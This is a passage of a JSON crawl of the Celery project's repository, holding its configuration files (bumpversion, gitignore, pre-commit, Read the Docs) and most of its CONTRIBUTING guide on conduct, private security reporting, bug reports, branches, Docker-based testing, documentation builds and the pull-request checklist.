{
  "metadata": {
    "timestamp": 1736557799737,
    "page": 981,
    "hasNextPage": false,
    "endCursor": "Y3Vyc29yOjEwMDA=",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "celery/celery",
      "stars": 25235,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".bumpversion.cfg",
          "type": "blob",
          "size": 0.34,
          "content": "[bumpversion]\ncurrent_version = 5.5.0rc4\ncommit = True\ntag = True\nparse = (?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)(?P<releaselevel>[a-z\\d]+)?\nserialize = \n\t{major}.{minor}.{patch}{releaselevel}\n\t{major}.{minor}.{patch}\n\n[bumpversion:file:celery/__init__.py]\n\n[bumpversion:file:docs/includes/introduction.txt]\n\n[bumpversion:file:README.rst]\n"
        },
        {
          "name": ".dockerignore",
          "type": "blob",
          "size": 0.3,
          "content": ".DS_Store\n*.pyc\n*$py.class\n*~\n.*.sw[pon]\ndist/\n*.egg-info\n*.egg\n*.egg/\n*.eggs/\nbuild/\n.build/\n_build/\npip-log.txt\n.directory\nerl_crash.dump\n*.db\nDocumentation/\n.tox/\n.ropeproject/\n.project\n.pydevproject\n.idea/\n.coverage\ncelery/tests/cover/\n.ve*\ncover/\n.vagrant/\n.cache/\nhtmlcov/\ncoverage.xml\ntest.db\n.git/\n"
        },
        {
          "name": ".editorconfig",
          "type": "blob",
          "size": 0.22,
          "content": "# http://editorconfig.org\n\nroot = true\n\n[*]\nindent_style = space\nindent_size = 4\ntrim_trailing_whitespace = true\ninsert_final_newline = true\ncharset = utf-8\nend_of_line = lf\nmax_line_length = 117\n\n[Makefile]\nindent_style = tab\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.4,
          "content": ".DS_Store\n*.pyc\n*$py.class\n*~\n.*.sw[pon]\ndist/\n*.egg-info\n*.egg\n*.egg/\n*.eggs/\nbuild/\n.build/\n_build/\npip-log.txt\n.directory\nerl_crash.dump\n*.db\nDocumentation/\n.tox/\n.ropeproject/\n.project\n.pydevproject\n.idea/\n.coverage\ncelery/tests/cover/\n.ve*\ncover/\n.vagrant/\n.cache/\nhtmlcov/\ncoverage.xml\ntest.db\npip-wheel-metadata/\n.python-version\n.vscode/\nintegration-tests-config.json\n[0-9]*\nstatefilename.*\ndump.rdb\n.env\n"
        },
        {
          "name": ".pre-commit-config.yaml",
          "type": "blob",
          "size": 1.05,
          "content": "repos:\n  - repo: https://github.com/asottile/pyupgrade\n    rev: v3.19.1\n    hooks:\n      - id: pyupgrade\n        args: [\"--py38-plus\"]\n\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n\n  - repo: https://github.com/asottile/yesqa\n    rev: v1.5.0\n    hooks:\n      - id: yesqa\n        exclude: ^celery/app/task\\.py$|^celery/backends/cache\\.py$\n\n  - repo: https://github.com/codespell-project/codespell\n    rev: v2.3.0\n    hooks:\n      - id: codespell # See pyproject.toml for args\n        args: [--toml, pyproject.toml, --write-changes]\n        additional_dependencies:\n          - tomli\n\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v5.0.0\n    hooks:\n      - id: check-merge-conflict\n      - id: check-toml\n      - id: check-yaml\n        exclude: helm-chart/templates/\n      - id: mixed-line-ending\n\n  - repo: https://github.com/pycqa/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.14.0\n    hooks:\n    -   id: mypy\n        pass_filenames: false\n"
        },
        {
          "name": ".readthedocs.yaml",
          "type": "blob",
          "size": 0.6,
          "content": "# Read the Docs configuration file\n# See https://docs.readthedocs.io/en/stable/config-file/v2.html for details\n\n# Required\nversion: 2\n\n# Set the version of Python and other tools you might need\nbuild:\n  os: ubuntu-20.04\n  tools:\n    python: \"3.9\"\n\n# Build documentation in the docs/ directory with Sphinx\nsphinx:\n   configuration: docs/conf.py\n\n# If using Sphinx, optionally build your docs in additional formats such as PDF\n# formats:\n#    - pdf\n\n# Optionally declare the Python requirements required to build your docs\npython:\n   install:\n    - method: pip\n      path: .\n    - requirements: requirements/docs.txt\n"
        },
        {
          "name": "CONTRIBUTING.rst",
          "type": "blob",
          "size": 43.62,
          "content": ".. _contributing:\n\n==============\n Contributing\n==============\n\nWelcome!\n\nThis document is fairly extensive and you aren't really expected\nto study this in detail for small contributions;\n\n    The most important rule is that contributing must be easy\n    and that the community is friendly and not nitpicking on details,\n    such as coding style.\n\nIf you're reporting a bug you should read the Reporting bugs section\nbelow to ensure that your bug report contains enough information\nto successfully diagnose the issue, and if you're contributing code\nyou should try to mimic the conventions you see surrounding the code\nyou're working on, but in the end all patches will be cleaned up by\nthe person merging the changes so don't worry too much.\n\n.. contents::\n    :local:\n\n.. _community-code-of-conduct:\n\nCommunity Code of Conduct\n=========================\n\nThe goal is to maintain a diverse community that's pleasant for everyone.\nThat's why we would greatly appreciate it if everyone contributing to and\ninteracting with the community also followed this Code of Conduct.\n\nThe Code of Conduct covers our behavior as members of the community,\nin any forum, mailing list, wiki, website, Internet relay chat (IRC), public\nmeeting or private correspondence.\n\nThe Code of Conduct is heavily based on the `Ubuntu Code of Conduct`_, and\nthe `Pylons Code of Conduct`_.\n\n.. _`Ubuntu Code of Conduct`: https://www.ubuntu.com/community/conduct\n.. _`Pylons Code of Conduct`: https://pylonsproject.org/community-code-of-conduct.html\n\nBe considerate\n--------------\n\nYour work will be used by other people, and you in turn will depend on the\nwork of others. Any decision you take will affect users and colleagues, and\nwe expect you to take those consequences into account when making decisions.\nEven if it's not obvious at the time, our contributions to Celery will impact\nthe work of others. For example, changes to code, infrastructure, policy,\ndocumentation and translations during a release may negatively impact\nothers' work.\n\nBe respectful\n-------------\n\nThe Celery community and its members treat one another with respect. Everyone\ncan make a valuable contribution to Celery. We may not always agree, but\ndisagreement is no excuse for poor behavior and poor manners. We might all\nexperience some frustration now and then, but we cannot allow that frustration\nto turn into a personal attack. It's important to remember that a community\nwhere people feel uncomfortable or threatened isn't a productive one. We\nexpect members of the Celery community to be respectful when dealing with\nother contributors as well as with people outside the Celery project and with\nusers of Celery.\n\nBe collaborative\n----------------\n\nCollaboration is central to Celery and to the larger free software community.\nWe should always be open to collaboration. Your work should be done\ntransparently and patches from Celery should be given back to the community\nwhen they're made, not just when the distribution releases. If you wish\nto work on new code for existing upstream projects, at least keep those\nprojects informed of your ideas and progress. It many not be possible to\nget consensus from upstream, or even from your colleagues about the correct\nimplementation for an idea, so don't feel obliged to have that agreement\nbefore you begin, but at least keep the outside world informed of your work,\nand publish your work in a way that allows outsiders to test, discuss, and\ncontribute to your efforts.\n\nWhen you disagree, consult others\n---------------------------------\n\nDisagreements, both political and technical, happen all the time and\nthe Celery community is no exception. It's important that we resolve\ndisagreements and differing views constructively and with the help of the\ncommunity and community process. If you really want to go a different\nway, then we encourage you to make a derivative distribution or alternate\nset of packages that still build on the work we've done to utilize as common\nof a core as possible.\n\nWhen you're unsure, ask for help\n--------------------------------\n\nNobody knows everything, and nobody is expected to be perfect. Asking\nquestions avoids many problems down the road, and so questions are\nencouraged. Those who are asked questions should be responsive and helpful.\nHowever, when asking a question, care must be taken to do so in an appropriate\nforum.\n\nStep down considerately\n-----------------------\n\nDevelopers on every project come and go and Celery is no different. When you\nleave or disengage from the project, in whole or in part, we ask that you do\nso in a way that minimizes disruption to the project. This means you should\ntell people you're leaving and take the proper steps to ensure that others\ncan pick up where you left off.\n\n.. _reporting-bugs:\n\n\nReporting Bugs\n==============\n\n.. _vulnsec:\n\nSecurity\n--------\n\nYou must never report security related issues, vulnerabilities or bugs\nincluding sensitive information to the bug tracker, or elsewhere in public.\nInstead sensitive bugs must be sent by email to ``security@celeryproject.org``.\n\nIf you'd like to submit the information encrypted our PGP key is::\n\n    -----BEGIN PGP PUBLIC KEY BLOCK-----\n    Version: GnuPG v1.4.15 (Darwin)\n\n    mQENBFJpWDkBCADFIc9/Fpgse4owLNvsTC7GYfnJL19XO0hnL99sPx+DPbfr+cSE\n    9wiU+Wp2TfUX7pCLEGrODiEP6ZCZbgtiPgId+JYvMxpP6GXbjiIlHRw1EQNH8RlX\n    cVxy3rQfVv8PGGiJuyBBjxzvETHW25htVAZ5TI1+CkxmuyyEYqgZN2fNd0wEU19D\n    +c10G1gSECbCQTCbacLSzdpngAt1Gkrc96r7wGHBBSvDaGDD2pFSkVuTLMbIRrVp\n    lnKOPMsUijiip2EMr2DvfuXiUIUvaqInTPNWkDynLoh69ib5xC19CSVLONjkKBsr\n    Pe+qAY29liBatatpXsydY7GIUzyBT3MzgMJlABEBAAG0MUNlbGVyeSBTZWN1cml0\n    eSBUZWFtIDxzZWN1cml0eUBjZWxlcnlwcm9qZWN0Lm9yZz6JATgEEwECACIFAlJp\n    WDkCGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEOArFOUDCicIw1IH/26f\n    CViDC7/P13jr+srRdjAsWvQztia9HmTlY8cUnbmkR9w6b6j3F2ayw8VhkyFWgYEJ\n    wtPBv8mHKADiVSFARS+0yGsfCkia5wDSQuIv6XqRlIrXUyqJbmF4NUFTyCZYoh+C\n    ZiQpN9xGhFPr5QDlMx2izWg1rvWlG1jY2Es1v/xED3AeCOB1eUGvRe/uJHKjGv7J\n    rj0pFcptZX+WDF22AN235WYwgJM6TrNfSu8sv8vNAQOVnsKcgsqhuwomSGsOfMQj\n    LFzIn95MKBBU1G5wOs7JtwiV9jefGqJGBO2FAvOVbvPdK/saSnB+7K36dQcIHqms\n    5hU4Xj0RIJiod5idlRC5AQ0EUmlYOQEIAJs8OwHMkrdcvy9kk2HBVbdqhgAREMKy\n    gmphDp7prRL9FqSY/dKpCbG0u82zyJypdb7QiaQ5pfPzPpQcd2dIcohkkh7G3E+e\n    hS2L9AXHpwR26/PzMBXyr2iNnNc4vTksHvGVDxzFnRpka6vbI/hrrZmYNYh9EAiv\n    uhE54b3/XhXwFgHjZXb9i8hgJ3nsO0pRwvUAM1bRGMbvf8e9F+kqgV0yWYNnh6QL\n    4Vpl1+epqp2RKPHyNQftbQyrAHXT9kQF9pPlx013MKYaFTADscuAp4T3dy7xmiwS\n    crqMbZLzfrxfFOsNxTUGE5vmJCcm+mybAtRo4aV6ACohAO9NevMx8pUAEQEAAYkB\n    HwQYAQIACQUCUmlYOQIbDAAKCRDgKxTlAwonCNFbB/9esir/f7TufE+isNqErzR/\n    aZKZo2WzZR9c75kbqo6J6DYuUHe6xI0OZ2qZ60iABDEZAiNXGulysFLCiPdatQ8x\n    8zt3DF9BMkEck54ZvAjpNSern6zfZb1jPYWZq3TKxlTs/GuCgBAuV4i5vDTZ7xK/\n    aF+OFY5zN7ciZHkqLgMiTZ+RhqRcK6FhVBP/Y7d9NlBOcDBTxxE1ZO1ute6n7guJ\n    ciw4hfoRk8qNN19szZuq3UU64zpkM2sBsIFM9tGF2FADRxiOaOWZHmIyVZriPFqW\n    RUwjSjs7jBVNq0Vy4fCu/5+e+XLOUBOoqtM5W7ELt0t1w9tXebtPEetV86in8fU2\n    =0chn\n    -----END PGP PUBLIC KEY BLOCK-----\n\nOther bugs\n----------\n\nBugs can always be described to the :ref:`mailing-list`, but the best\nway to report an issue and to ensure a timely response is to use the\nissue tracker.\n\n1) **Create a GitHub account**.\n\nYou need to `create a GitHub account`_ to be able to create new issues\nand participate in the discussion.\n\n.. _`create a GitHub account`: https://github.com/signup/free\n\n2) **Determine if your bug is really a bug**.\n\nYou shouldn't file a bug if you're requesting support. For that you can use\nthe :ref:`mailing-list`, or :ref:`irc-channel`. If you still need support\nyou can open a github issue, please prepend the title with ``[QUESTION]``.\n\n3) **Make sure your bug hasn't already been reported**.\n\nSearch through the appropriate Issue tracker. If a bug like yours was found,\ncheck if you have new information that could be reported to help\nthe developers fix the bug.\n\n4) **Check if you're using the latest version**.\n\nA bug could be fixed by some other improvements and fixes - it might not have an\nexisting report in the bug tracker. Make sure you're using the latest releases of\ncelery, billiard, kombu, amqp, and vine.\n\n5) **Collect information about the bug**.\n\nTo have the best chance of having a bug fixed, we need to be able to easily\nreproduce the conditions that caused it. Most of the time this information\nwill be from a Python traceback message, though some bugs might be in design,\nspelling or other errors on the website/docs/code.\n\n    A) If the error is from a Python traceback, include it in the bug report.\n\n    B) We also need to know what platform you're running (Windows, macOS, Linux,\n       etc.), the version of your Python interpreter, and the version of Celery,\n       and related packages that you were running when the bug occurred.\n\n    C) If you're reporting a race condition or a deadlock, tracebacks can be\n       hard to get or might not be that useful. Try to inspect the process to\n       get more diagnostic data. Some ideas:\n\n       * Enable Celery's :ref:`breakpoint signal <breakpoint_signal>` and use it\n         to inspect the process's state. This will allow you to open a\n         :mod:`pdb` session.\n       * Collect tracing data using `strace`_(Linux),\n         :command:`dtruss` (macOS), and :command:`ktrace` (BSD),\n         `ltrace`_, and `lsof`_.\n\n    D) Include the output from the :command:`celery report` command:\n\n        .. code-block:: console\n\n            $ celery -A proj report\n\n        This will also include your configuration settings and it will try to\n        remove values for keys known to be sensitive, but make sure you also\n        verify the information before submitting so that it doesn't contain\n        confidential information like API tokens and authentication\n        credentials.\n\n    E) Your issue might be tagged as `Needs Test Case`. A test case represents\n       all the details needed to reproduce what your issue is reporting.\n       A test case can be some minimal code that reproduces the issue or\n       detailed instructions and configuration values that reproduces\n       said issue.\n\n6) **Submit the bug**.\n\nBy default `GitHub`_ will email you to let you know when new comments have\nbeen made on your bug. In the event you've turned this feature off, you\nshould check back on occasion to ensure you don't miss any questions a\ndeveloper trying to fix the bug might ask.\n\n.. _`GitHub`: https://github.com\n.. _`strace`: https://en.wikipedia.org/wiki/Strace\n.. _`ltrace`: https://en.wikipedia.org/wiki/Ltrace\n.. _`lsof`: https://en.wikipedia.org/wiki/Lsof\n\n.. _issue-trackers:\n\nIssue Trackers\n--------------\n\nBugs for a package in the Celery ecosystem should be reported to the relevant\nissue tracker.\n\n* :pypi:`celery`: https://github.com/celery/celery/issues/\n* :pypi:`kombu`: https://github.com/celery/kombu/issues\n* :pypi:`amqp`: https://github.com/celery/py-amqp/issues\n* :pypi:`vine`: https://github.com/celery/vine/issues\n* :pypi:`pytest-celery`: https://github.com/celery/pytest-celery/issues\n* :pypi:`librabbitmq`: https://github.com/celery/librabbitmq/issues\n* :pypi:`django-celery-beat`: https://github.com/celery/django-celery-beat/issues\n* :pypi:`django-celery-results`: https://github.com/celery/django-celery-results/issues\n\nIf you're unsure of the origin of the bug you can ask the\n:ref:`mailing-list`, or just use the Celery issue tracker.\n\nContributors guide to the code base\n===================================\n\nThere's a separate section for internal details,\nincluding details about the code base and a style guide.\n\nRead :ref:`internals-guide` for more!\n\n.. _versions:\n\nVersions\n========\n\nVersion numbers consists of a major version, minor version and a release number.\nSince version 2.1.0 we use the versioning semantics described by\nSemVer: http://semver.org.\n\nStable releases are published at PyPI\nwhile development releases are only available in the GitHub git repository as tags.\nAll version tags starts with “v”, so version 0.8.0 has the tag v0.8.0.\n\n.. _git-branches:\n\nBranches\n========\n\nCurrent active version branches:\n\n* dev (which git calls \"main\") (https://github.com/celery/celery/tree/main)\n* 4.5 (https://github.com/celery/celery/tree/v4.5)\n* 3.1 (https://github.com/celery/celery/tree/3.1)\n\nYou can see the state of any branch by looking at the Changelog:\n\n    https://github.com/celery/celery/blob/main/Changelog.rst\n\nIf the branch is in active development the topmost version info should\ncontain meta-data like:\n\n.. code-block:: restructuredtext\n\n    4.3.0\n    ======\n    :release-date: TBA\n    :status: DEVELOPMENT\n    :branch: dev (git calls this main)\n\nThe ``status`` field can be one of:\n\n* ``PLANNING``\n\n    The branch is currently experimental and in the planning stage.\n\n* ``DEVELOPMENT``\n\n    The branch is in active development, but the test suite should\n    be passing and the product should be working and possible for users to test.\n\n* ``FROZEN``\n\n    The branch is frozen, and no more features will be accepted.\n    When a branch is frozen the focus is on testing the version as much\n    as possible before it is released.\n\ndev branch\n----------\n\nThe dev branch (called \"main\" by git), is where development of the next\nversion happens.\n\nMaintenance branches\n--------------------\n\nMaintenance branches are named after the version -- for example,\nthe maintenance branch for the 2.2.x series is named ``2.2``.\n\nPreviously these were named ``releaseXX-maint``.\n\nThe versions we currently maintain is:\n\n* 4.2\n\n  This is the current series.\n\n* 4.1\n\n  Drop support for python 2.6. Add support for python 3.4, 3.5 and 3.6.\n\n* 3.1\n\n  Official support for python 2.6, 2.7 and 3.3, and also supported on PyPy.\n\nArchived branches\n-----------------\n\nArchived branches are kept for preserving history only,\nand theoretically someone could provide patches for these if they depend\non a series that's no longer officially supported.\n\nAn archived version is named ``X.Y-archived``.\n\nTo maintain a cleaner history and drop compatibility to continue improving\nthe project, we **do not have any archived version** right now.\n\nFeature branches\n----------------\n\nMajor new features are worked on in dedicated branches.\nThere's no strict naming requirement for these branches.\n\nFeature branches are removed once they've been merged into a release branch.\n\nTags\n====\n\n- Tags are used exclusively for tagging releases. A release tag is\n  named with the format ``vX.Y.Z`` -- for example ``v2.3.1``.\n\n- Experimental releases contain an additional identifier ``vX.Y.Z-id`` --\n  for example ``v3.0.0-rc1``.\n\n- Experimental tags may be removed after the official release.\n\n.. _contributing-changes:\n\nWorking on Features & Patches\n=============================\n\n.. note::\n\n    Contributing to Celery should be as simple as possible,\n    so none of these steps should be considered mandatory.\n\n    You can even send in patches by email if that's your preferred\n    work method. We won't like you any less, any contribution you make\n    is always appreciated!\n\n    However, following these steps may make maintainer's life easier,\n    and may mean that your changes will be accepted sooner.\n\nForking and setting up the repository\n-------------------------------------\n\nFirst you need to fork the Celery repository; a good introduction to this\nis in the GitHub Guide: `Fork a Repo`_.\n\nAfter you have cloned the repository, you should checkout your copy\nto a directory on your machine:\n\n.. code-block:: console\n\n    $ git clone git@github.com:username/celery.git\n\nWhen the repository is cloned, enter the directory to set up easy access\nto upstream changes:\n\n.. code-block:: console\n\n    $ cd celery\n    $ git remote add upstream git@github.com:celery/celery.git\n    $ git fetch upstream\n\nIf you need to pull in new changes from upstream you should\nalways use the ``--rebase`` option to ``git pull``:\n\n.. code-block:: console\n\n    git pull --rebase upstream main\n\nWith this option, you don't clutter the history with merging\ncommit notes. See `Rebasing merge commits in git`_.\nIf you want to learn more about rebasing, see the `Rebase`_\nsection in the GitHub guides.\n\nIf you need to work on a different branch than the one git calls ``main``, you can\nfetch and checkout a remote branch like this::\n\n    git checkout --track -b 5.0-devel upstream/5.0-devel\n\n**Note:** Any feature or fix branch should be created from ``upstream/main``.\n\n.. _`Fork a Repo`: https://help.github.com/fork-a-repo/\n.. _`Rebasing merge commits in git`:\n    https://web.archive.org/web/20150627054345/http://marketblog.envato.com/general/rebasing-merge-commits-in-git/\n.. _`Rebase`: https://help.github.com/rebase/\n\n.. _contributing-docker-development:\n\nDeveloping and Testing with Docker\n----------------------------------\n\nBecause of the many components of Celery, such as a broker and backend,\n`Docker`_ and `docker-compose`_ can be utilized to greatly simplify the\ndevelopment and testing cycle. The Docker configuration here requires a\nDocker version of at least 17.13.0 and `docker-compose` 1.13.0+.\n\nThe Docker components can be found within the :file:`docker/` folder and the\nDocker image can be built via:\n\n.. code-block:: console\n\n    $ docker compose build celery\n\nand run via:\n\n.. code-block:: console\n\n    $ docker compose run --rm celery <command>\n\nwhere <command> is a command to execute in a Docker container. The `--rm` flag\nindicates that the container should be removed after it is exited and is useful\nto prevent accumulation of unwanted containers.\n\nSome useful commands to run:\n\n* ``bash``\n\n    To enter the Docker container like a normal shell\n\n* ``make test``\n\n    To run the test suite.\n    **Note:** This will run tests using python 3.12 by default.\n\n* ``tox``\n\n    To run tox and test against a variety of configurations.\n    **Note:** This command will run tests for every environment defined in :file:`tox.ini`.\n    It takes a while.\n\n* ``pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/unit``\n\n    To run unit tests using pytest.\n\n    **Note:** ``{3.8,3.9,3.10,3.11,3.12}`` means you can use any of those options.\n    e.g. ``pyenv exec python3.12 -m pytest t/unit``\n\n* ``pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/integration``\n\n    To run integration tests using pytest\n\n    **Note:** ``{3.8,3.9,3.10,3.11,3.12}`` means you can use any of those options.\n    e.g. ``pyenv exec python3.12 -m pytest t/unit``\n\nBy default, docker-compose will mount the Celery and test folders in the Docker\ncontainer, allowing code changes and testing to be immediately visible inside\nthe Docker container. Environment variables, such as the broker and backend to\nuse are also defined in the :file:`docker/docker-compose.yml` file.\n\nBy running ``docker compose build celery`` an image will be created with the\nname ``celery/celery:dev``. This docker image has every dependency needed\nfor development installed. ``pyenv`` is used to install multiple python\nversions, the docker image offers python 3.8, 3.9, 3.10, 3.11 and 3.12.\nThe default python version is set to 3.12.\n\nThe :file:`docker-compose.yml` file defines the necessary environment variables\nto run integration tests. The ``celery`` service also mounts the codebase\nand sets the ``PYTHONPATH`` environment variable to ``/home/developer/celery``.\nBy setting ``PYTHONPATH`` the service allows to use the mounted codebase\nas global module for development. If you prefer, you can also run\n``python -m pip install -e .`` to install the codebase in development mode.\n\nIf you would like to run a Django or stand alone project to manually test or\ndebug a feature, you can use the image built by `docker compose` and mount\nyour custom code. Here's an example:\n\nAssuming a folder structure such as:\n\n.. code-block:: console\n\n    + celery_project\n      + celery # repository cloned here.\n      + my_project\n        - manage.py\n        + my_project\n          - views.py\n\n.. code-block:: yaml\n\n   version: \"3\"\n\n   services:\n       celery:\n           image: celery/celery:dev\n           environment:\n               TEST_BROKER: amqp://rabbit:5672\n               TEST_BACKEND: redis://redis\n            volumes:\n                - ../../celery:/home/developer/celery\n                - ../my_project:/home/developer/my_project\n            depends_on:\n                - rabbit\n                - redis\n        rabbit:\n            image: rabbitmq:latest\n        redis:\n            image: redis:latest\n\nIn the previous example, we are using the image that we can build from\nthis repository and mounting the celery code base as well as our custom\nproject.\n\n.. _`Docker`: https://www.docker.com/\n.. _`docker-compose`: https://docs.docker.com/compose/\n\n.. _contributing-testing:\n\nRunning the unit test suite\n---------------------------\n\nIf you like to develop using virtual environments or just outside docker,\nyou must make sure all necessary dependencies are installed.\nThere are multiple requirements files to make it easier to install all dependencies.\nYou do not have to use every requirements file but you must use `default.txt`.\n\n.. code-block:: console\n\n   # pip install -U -r requirements/default.txt\n\nTo run the Celery test suite you need to install\n:file:`requirements/test.txt`.\n\n.. code-block:: console\n\n    $ pip install -U -r requirements/test.txt\n    $ pip install -U -r requirements/default.txt\n\nAfter installing the dependencies required, you can now execute\nthe test suite by calling :pypi:`pytest <pytest>`:\n\n.. code-block:: console\n\n    $ pytest t/unit\n    $ pytest t/integration\n\nSome useful options to :command:`pytest` are:\n\n* ``-x``\n\n    Stop running the tests at the first test that fails.\n\n* ``-s``\n\n    Don't capture output\n\n* ``-v``\n\n    Run with verbose output.\n\nIf you want to run the tests for a single test file only\nyou can do so like this:\n\n.. code-block:: console\n\n    $ pytest t/unit/worker/test_worker.py\n\n.. _contributing-coverage:\n\nCalculating test coverage\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTo calculate test coverage you must first install the :pypi:`pytest-cov` module.\n\nInstalling the :pypi:`pytest-cov` module:\n\n.. code-block:: console\n\n    $ pip install -U pytest-cov\n\nCode coverage in HTML format\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n#. Run :command:`pytest` with the ``--cov-report=html`` argument enabled:\n\n    .. code-block:: console\n\n        $ pytest --cov=celery --cov-report=html\n\n#. The coverage output will then be located in the :file:`htmlcov/` directory:\n\n    .. code-block:: console\n\n        $ open htmlcov/index.html\n\nCode coverage in XML (Cobertura-style)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n#. Run :command:`pytest` with the ``--cov-report=xml`` argument enabled:\n\n.. code-block:: console\n\n    $ pytest --cov=celery --cov-report=xml\n\n#. The coverage XML output will then be located in the :file:`coverage.xml` file.\n\n.. _contributing-tox:\n\nRunning the tests on all supported Python versions\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere's a :pypi:`tox` configuration file in the top directory of the\ndistribution.\n\nTo run the tests for all supported Python versions simply execute:\n\n.. code-block:: console\n\n    $ tox\n\nUse the ``tox -e`` option if you only want to test specific Python versions:\n\n.. code-block:: console\n\n    $ tox -e 3.7\n\nBuilding the documentation\n--------------------------\n\nTo build the documentation, you need to install the dependencies\nlisted in :file:`requirements/docs.txt` and :file:`requirements/default.txt`:\n\n.. code-block:: console\n\n    $ pip install -U -r requirements/docs.txt\n    $ pip install -U -r requirements/default.txt\n\nAdditionally, to build with no warnings, you will need to install\nthe following packages:\n\n.. code-block:: console\n\n   $ apt-get install texlive texlive-latex-extra dvipng\n\nAfter these dependencies are installed, you should be able to\nbuild the docs by running:\n\n.. code-block:: console\n\n    $ cd docs\n    $ rm -rf _build\n    $ make html\n\nMake sure there are no errors or warnings in the build output.\nAfter building succeeds, the documentation is available at :file:`_build/html`.\n\n.. _contributing-verify:\n\nBuild the documentation using Docker\n------------------------------------\n\nBuild the documentation by running:\n\n.. code-block:: console\n\n    $ docker compose -f docker/docker-compose.yml up --build docs\n\nThe service will start a local docs server at ``:7000``. The server is using\n``sphinx-autobuild`` with the ``--watch`` option enabled, so you can live\nedit the documentation. Check the additional options and configs in\n:file:`docker/docker-compose.yml`\n\nVerifying your contribution\n---------------------------\n\nTo use these tools, you need to install a few dependencies. These dependencies\ncan be found in :file:`requirements/pkgutils.txt`.\n\nInstalling the dependencies:\n\n.. code-block:: console\n\n    $ pip install -U -r requirements/pkgutils.txt\n\npyflakes & PEP-8\n~~~~~~~~~~~~~~~~\n\nTo ensure that your changes conform to :pep:`8` and to run pyflakes\nexecute:\n\n.. code-block:: console\n\n    $ make flakecheck\n\nTo not return a negative exit code when this command fails, use\nthe ``flakes`` target instead:\n\n.. code-block:: console\n\n    $ make flakes\n\nAPI reference\n~~~~~~~~~~~~~\n\nTo make sure that all modules have a corresponding section in the API\nreference, please execute:\n\n.. code-block:: console\n\n    $ make apicheck\n\nIf files are missing, you can add them by copying an existing reference file.\n\nIf the module is internal, it should be part of the internal reference\nlocated in :file:`docs/internals/reference/`. If the module is public,\nit should be located in :file:`docs/reference/`.\n\nFor example, if reference is missing for the module ``celery.worker.awesome``\nand this module is considered part of the public API, use the following steps:\n\n\nUse an existing file as a template:\n\n.. code-block:: console\n\n    $ cd docs/reference/\n    $ cp celery.schedules.rst celery.worker.awesome.rst\n\nEdit the file using your favorite editor:\n\n.. code-block:: console\n\n    $ vim celery.worker.awesome.rst\n\n        # change every occurrence of ``celery.schedules`` to\n        # ``celery.worker.awesome``\n\n\nEdit the index using your favorite editor:\n\n.. code-block:: console\n\n    $ vim index.rst\n\n        # Add ``celery.worker.awesome`` to the index.\n\n\nCommit your changes:\n\n.. code-block:: console\n\n    # Add the file to git\n    $ git add celery.worker.awesome.rst\n    $ git add index.rst\n    $ git commit celery.worker.awesome.rst index.rst \\\n        -m \"Adds reference for celery.worker.awesome\"\n\nIsort\n~~~~~~\n\n`Isort`_ is a python utility to help sort imports alphabetically and separated into sections.\nThe Celery project uses isort to better maintain imports on every module.\nPlease run isort if there are any new modules or the imports on an existent module\nhad to be modified.\n\n.. code-block:: console\n\n   $ isort my_module.py # Run isort for one file\n   $ isort -rc . # Run it recursively\n   $ isort m_module.py --diff # Do a dry-run to see the proposed changes\n\n.. _`Isort`: https://isort.readthedocs.io/en/latest/\n\n.. _contributing-pull-requests:\n\nCreating pull requests\n----------------------\n\nWhen your feature/bugfix is complete, you may want to submit\na pull request, so that it can be reviewed by the maintainers.\n\nBefore submitting a pull request, please make sure you go through this checklist to\nmake it easier for the maintainers to accept your proposed changes:\n\n- [ ] Make sure any change or new feature has a unit and/or integration test.\n      If a test is not written, a label will be assigned to your PR with the name\n      ``Needs Test Coverage``.\n\n- [ ] Make sure unit test coverage does not decrease.\n      ``pytest -xv --cov=celery --cov-report=xml --cov-report term``.\n      You can check the current test coverage here: https://codecov.io/gh/celery/celery\n\n- [ ] Run ``pre-commit`` against the code. The following commands are valid\n      and equivalent.:\n\n      .. code-block:: console\n\n          $ pre-commit run --all-files\n          $ tox -e lint\n\n- [ ]  Build api docs to make sure everything is OK. The following commands are valid\n      and equivalent.:\n\n      .. code-block:: console\n\n          $ make apicheck\n          $ cd docs && sphinx-build -b apicheck -d _build/doctrees . _build/apicheck\n          $ tox -e apicheck\n\n- [ ] Build configcheck. The following commands are valid\n      and equivalent.:\n\n      .. code-block:: console\n\n          $ make configcheck\n          $ cd docs && sphinx-build -b configcheck -d _build/doctrees   . _build/configcheck\n          $ tox -e configcheck\n\n- [ ] Run ``bandit`` to make sure there's no security issues. The following commands are valid\n      and equivalent.:\n\n      .. code-block:: console\n\n          $ pip install -U bandit\n          $ bandit -b bandit.json celery/\n          $ tox -e bandit\n\n- [ ] Run unit and integration tests for every python version. The following commands are valid\n      and equivalent.:\n\n      .. code-block:: console\n\n         $ tox -v\n\n- [ ] Confirm ``isort`` on any new or modified imports:\n\n      .. code-block:: console\n\n        $ isort my_module.py --diff\n\nCreating pull requests is easy, and they also let you track the progress\nof your contribution. Read the `Pull Requests`_ section in the GitHub\nGuide to learn how this is done.\n\nYou can also attach pull requests to existing issues by following\nthe steps outlined here: https://bit.ly/koJoso\n\nYou can also use `hub`_ to create pull requests. Example: https://theiconic.tech/git-hub-fbe2e13ef4d1\n\n.. _`Pull Requests`: http://help.github.com/send-pull-requests/\n\n.. _`hub`: https://hub.github.com/\n\nStatus Labels\n~~~~~~~~~~~~~~\n\nThere are `different labels`_ used to easily manage github issues and PRs.\nMost of these labels make it easy to categorize each issue with important\ndetails. For instance, you might see a ``Component:canvas`` label on an issue or PR.\nThe ``Component:canvas`` label means the issue or 